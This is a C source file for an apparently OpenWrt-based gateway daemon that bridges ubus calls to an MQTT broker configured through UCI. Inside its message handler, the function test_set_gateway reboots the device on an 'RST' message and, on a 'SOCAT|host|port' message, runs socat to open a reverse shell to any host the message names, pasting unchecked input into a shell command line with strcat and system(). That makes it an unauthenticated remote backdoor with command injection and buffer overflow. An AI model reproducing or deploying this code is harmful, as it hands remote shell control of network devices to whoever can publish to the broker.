
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>

#include <syslog.h>
#include <pthread.h>

#include <libubox/blobmsg_json.h>
#include <libubox/uloop.h>
#include <libubus.h>

#include <uci.h>

#include "myqueue.h"
#include "mymqtt.h"



static intptr_t qctx;
static intptr_t mtctx;


enum {
    PUB_TOPIC,
    PUB_MESG,
    __PUB_MAX 
};

static const struct blobmsg_policy  public_policy[] = {
    [PUB_TOPIC] = { .name = "topic", .type = BLOBMSG_TYPE_STRING },
    [PUB_MESG] = { .name = "message", .type = BLOBMSG_TYPE_STRING },
};


static int mtbridge_public( struct ubus_context *ctx, struct ubus_object *obj,
                struct ubus_request_data *req, const char *method,
                struct blob_attr *msg )
{
    struct blob_attr * tb[__PUB_MAX];
    char * topic = NULL;
    char * mssge = NULL;
    
    /**/
    blobmsg_parse( public_policy, ARRAY_SIZE(public_policy), tb, blob_data(msg), blob_len(msg));
    
    if ( tb[PUB_TOPIC] )
    {
        topic = blobmsg_data( tb[PUB_TOPIC] );
    }
    
    if ( tb[PUB_MESG] )
    {
        mssge = blobmsg_data( tb[PUB_MESG] );
    }

    /**/
    printf( "ubus, %s, %s\n", topic, mssge );
    
    /**/
    mmqt_publish( mtctx, topic, mssge );
    return UBUS_STATUS_OK;

}


static const struct ubus_method mtbridge_methods[] = {
    UBUS_METHOD( "publish", mtbridge_public, public_policy ),    
};


static struct ubus_object_type system_object_type =
    UBUS_OBJECT_TYPE("mtbridge_iface", mtbridge_methods);


static struct ubus_object mtbridge_object = {
    .name = "we26n_mtbridge",
    .type = &system_object_type,
    .methods = mtbridge_methods,
    .n_methods = ARRAY_SIZE(mtbridge_methods),
};



int  ubussrv_server_add( void )
{
    int ret;
    struct ubus_context * ctx;

    /**/
    ctx = ubus_connect( NULL );
    if ( NULL == ctx) 
    {
        return 1;
    }

    /**/
    ubus_add_uloop( ctx );

    /**/
    ret = ubus_add_object( ctx, &mtbridge_object );
    if (ret)
    {
        fprintf(stderr, "Failed to add object: %s\n", ubus_strerror(ret));
        return 2;
    }
    
    return 0;
    
}


void  test_set_gateway( char * msg )
{
    if ( 0 == strcmp( msg, "RST" ) )
    {
        system( "reboot" );
        return;
    }

    if ( 0 == strncmp( msg, "SOCAT|", 6) )
    {
        char * paddr;
        char * pport;
        char  cmdln[128] = "socat 'exec:sh,pty,stderr'  tcp4-connect:";
        /**/
        paddr = &(msg[6]);
        pport = strchr( paddr, '|' );
        if ( pport == NULL )
        {
            return;
        }
        *pport = ':';
        
        /**/
        strcat( cmdln, paddr );
        strcat( cmdln, " &" );
        system( cmdln );
        return;
    }
    
    return;
    
}



void  test_uloopfd_cbk(struct uloop_fd * pufd, unsigned int events)
{
    int  iret;
    int  tfd;
    intptr_t  qctx;
    uint8_t tary[4];
    int  tlen;
    mmqt_msg_t * pmsg;

    /**/
    printf( "ufd cbk\n" );
    
    /**/
    qctx = *((intptr_t *)(pufd + 1));
    tfd = (int)*((intptr_t *)(pufd + 1) + 1);

    /**/
    read( tfd, tary, 4 );

    /**/
    while(1)
    {
        iret = msq_dequeue( qctx, (void **)&pmsg, &tlen );
        if ( 0 != iret )
        {
            return;
        }

        /**/
        printf( "msq : %d,%d : %s\n", pmsg->action, pmsg->object, pmsg->msg );

        /**/
        if ( (pmsg->action == MT_ACT_SET) && (pmsg->object == MT_OBJ_GATE) )
        {
            test_set_gateway( pmsg->msg );
        }
        
    }

    /**/
    return;
    
}



int  test_uloopfd_add( int tfd, intptr_t qctx )
{
    int  iret;
    struct uloop_fd * pufd;

    /**/
    pufd = (struct uloop_fd *)malloc( sizeof(struct uloop_fd) + sizeof(intptr_t) + sizeof(intptr_t) );
    if ( NULL == pufd )
    {
        return 2;
    }

    /**/
    memset( pufd, 0, sizeof(struct uloop_fd) );
    pufd->fd = tfd;
    pufd->cb = test_uloopfd_cbk;
    *((intptr_t *)(pufd + 1)) = qctx;
    *((intptr_t *)(pufd + 1) + 1) = tfd;
    
    /**/    
    iret = uloop_fd_add( pufd, ULOOP_READ | ULOOP_BLOCKING );
    if ( iret < 0 )
    {
        return 4;
    }

    /**/
    return 0;
    
}


/*
cfg->port = 1883;
cfg->max_inflight = 20;
cfg->keepalive = 60;
cfg->clean_session = true;
cfg->eol = true;
cfg->protocol_version = MQTT_PROTOCOL_V31;
*/


int  test_run( char * ipdr, int port )
{
    int  iret;
    int  tfd;
    
    /**/
    iret = msq_init( &qctx );
    if ( 0 != iret )
    {
        return 1;
    }

    /**/
    iret = mmqt_init( qctx, ipdr, port, &mtctx );
    if ( 0 != iret )
    {
        return 2;
    }

    /**/
    mmqt_get_fd( mtctx, &tfd );
    
    /**/
    iret = mmqt_start_run( mtctx );
    if ( 0 != iret )
    {
        return 3;
    }


    /**/
    uloop_init();
    signal(SIGPIPE, SIG_IGN);

    /**/
    iret = ubussrv_server_add();
    if ( 0 != iret )
    {
        /*  */
        printf( "ubussrv_server_add fail, ret= %d\n", iret );
        return 4;
    }

    /**/
    iret = test_uloopfd_add( tfd, qctx );
    if ( 0 != iret )
    {
        return 5;
    }
    
    /**/
    uloop_run();
    uloop_done();
    
    /**/
    return 0;
    
}


int test_get_config( char * ipdr, int * port )
{
    struct uci_context * uci;
    struct uci_package * upkg;
    struct uci_element * uele;
    struct uci_section * usec;
    const char * ptr;
    int iret;
    

    /**/
    uci = uci_alloc_context();
    iret = uci_load( uci, "jyconfig", &upkg );
    if ( 0 != iret )
    {
        uci_free_context( uci );
		return 1;
    }
    
    /**/
    uci_foreach_element( &upkg->sections, uele )
    {
        usec = uci_to_section( uele );
        if( 0 != strcmp( usec->type, "mqttclient") )
        {
            continue;
        }

        /**/
        ptr = uci_lookup_option_string( uci, usec, "server" );
        if ( NULL == ptr )
        {
            iret = 2;
            break;
        }

        if ( strlen(ptr) > 16 )
        {
            iret = 4;
            break;
        }

        /**/
        strcpy( ipdr, ptr );
        
        /**/
	    ptr = uci_lookup_option_string( uci, usec, "port" );
        if ( NULL == ptr )
        {
            iret = 3;
            break;
        }

        /**/
        *port = strtoul( ptr, NULL, 10 );
        iret = 0;
        break;
    }

exit:
    uci_free_context( uci );
    return iret;
    
}


int  main( void )
{
    int  iret;
    char  ipdr[20];
    int  port;

    /**/
    iret = test_get_config( ipdr, &port );
    if ( 0 != iret )
    {
        printf( "get cfg ret %d\n", iret );
        return 1;
    }

    /**/
    
    /**/
    iret = test_run( ipdr, port );
    printf( "test ret %d\n", iret );
    return 0;
    
}



